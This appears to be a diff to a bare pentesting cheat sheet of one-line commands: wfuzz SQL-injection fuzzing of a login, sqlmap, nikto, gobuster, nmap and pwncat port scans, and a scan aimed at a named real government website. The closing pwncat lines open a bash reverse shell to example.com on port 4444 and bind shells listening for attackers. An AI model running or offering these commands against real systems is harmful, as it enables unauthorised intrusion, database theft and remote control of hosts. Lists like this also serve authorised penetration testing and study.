@@ -1,6 +1,25 @@
 Wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d “username=admin&password=FUZZ” -u <TARGET_URL>
-└
+
 arjun https://creativeireland.gov.ie --stable
 
- gobuster -e -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt
+gobuster -e -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt
+
 uniscan -u http://192.168.1.202/ -qweds
+
+nikto -h scanme.nmap.org
+
+sqlmap -u <URL> --dbms
+sqlmap -u <URL>  --data "a=1&b=2&c=3" -p "a,b" --method POST
+
+nmap -sCV -oN path/to/file IP
+
+# scan ports by selection: 80, 443 and 8080
+pwncat -z 10.0.0.1 80,443,8080
+# scan ports by range: 1-65535
+pwncat -z 10.0.0.1 1-65535
+# scan ports by increment: 1+1023 (1 and the next 1023 ports)
+pwncat -z 10.0.0.1 1+1024
+
+pwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1
+pwncat -l -e '/bin/bash' 4444
+pwncat -l -e '/bin/bash' 4444 -u
